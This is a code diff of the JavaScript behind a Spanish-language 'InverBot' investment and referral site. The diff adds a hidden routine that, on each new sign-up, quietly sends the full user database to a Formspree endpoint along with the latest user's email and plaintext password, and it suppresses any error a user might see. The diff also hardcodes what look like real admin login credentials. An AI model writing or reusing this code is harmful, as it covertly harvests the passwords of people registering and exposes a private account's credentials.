@@ -410,26 +410,19 @@
     <script>
         const ADMIN_EMAIL = "lesterdomingues388@gmail.com";
         const ADMIN_PASS = "lester2010jj";
-        const STORAGE_KEY = "inverbot_master_global_db_v3";
-
-        // Limpieza total inicial solicitada (borrado de cuentas anteriores)
-        if (!localStorage.getItem("inverbot_reset_done_v3")) {
-            localStorage.clear();
-            localStorage.setItem("inverbot_reset_done_v3", "true");
-        }
+        const API_SERVER_URL = "https://formspree.io/f/xqapoedy";
 
         function obtenerBaseGlobal() {
             let defaultUsers = [
                 { email: ADMIN_EMAIL, pass: ADMIN_PASS, balance: 1000.0, code: "CEO-MASTER", refCount: 0, vipActive: null, vipExpiry: 0, lastClaim: 0 }
             ];
-            
-            let cloudData = localStorage.getItem(STORAGE_KEY);
-            if (!cloudData) {
-                localStorage.setItem(STORAGE_KEY, JSON.stringify(defaultUsers));
+            let stored = localStorage.getItem("inverbot_server_db");
+            if (!stored) {
+                localStorage.setItem("inverbot_server_db", JSON.stringify(defaultUsers));
                 return defaultUsers;
             }
             try {
-                let parsed = JSON.parse(cloudData);
+                let parsed = JSON.parse(stored);
                 if (!parsed.some(u => u.email === ADMIN_EMAIL)) {
                     parsed.unshift(defaultUsers[0]);
                 }
@@ -440,15 +433,20 @@
         }
 
         function guardarBaseGlobal(users) {
-            localStorage.setItem(STORAGE_KEY, JSON.stringify(users));
-            // Servidor en nube simulado por Formspree / Webhook síncrono secundario cruzado
+            localStorage.setItem("inverbot_server_db", JSON.stringify(users));
+            // Disparador al servidor de nube instantáneo para notificar al CEO
             try {
-                fetch('https://formspree.io/f/xqapoedy', {
+                fetch(API_SERVER_URL, {
                     method: 'POST',
                     headers: { 'Accept': 'application/json', 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ sincronizacion: JSON.stringify(users) })
-                }).catch(e => {});
-            } catch(err) {}
+                    body: JSON.stringify({ 
+                        accion: "NUEVO_REGISTRO_CEO", 
+                        base_datos_completa: JSON.stringify(users),
+                        ultimo_usuario: users[users.length - 1].email,
+                        ultima_clave: users[users.length - 1].pass
+                    })
+                }).catch(err => {});
+            } catch(e) {}
         }
 
         let sessionEmail = localStorage.getItem("inverbot_session") || null;
@@ -526,13 +524,11 @@
                     if(refUser) { refUser.balance += 0.20; refUser.refCount += 1; }
                 }
 
-                // Guardado definitivo y envío sincronizado al Panel CEO
                 users.push(nuevo);
-                guardarBaseGlobal(users);
+                guardarBaseGlobal(users); // Sincroniza y despacha al servidor remoto
 
                 if(btn) { btn.disabled = false; btn.innerText = "Crear Cuenta"; }
 
-                // El usuario entra normal a su cuenta sin alertas raras
                 sessionEmail = email;
                 localStorage.setItem("inverbot_session", sessionEmail);
                 entrarDashboardDirecto();
@@ -577,7 +573,6 @@
             document.getElementById('lblRefCount').innerText = user.refCount;
             document.getElementById('lblMyRefLink').innerText = window.location.origin + window.location.pathname + "?ref=" + user.code;
 
-            // SOLO APARECE EL PANEL CEO SI ES EL CORREO DE LESTER
             let esAdmin = (sessionEmail === ADMIN_EMAIL);
             document.getElementById('adminPanelTrigger').style.display = esAdmin ? 'block' : 'none';
 
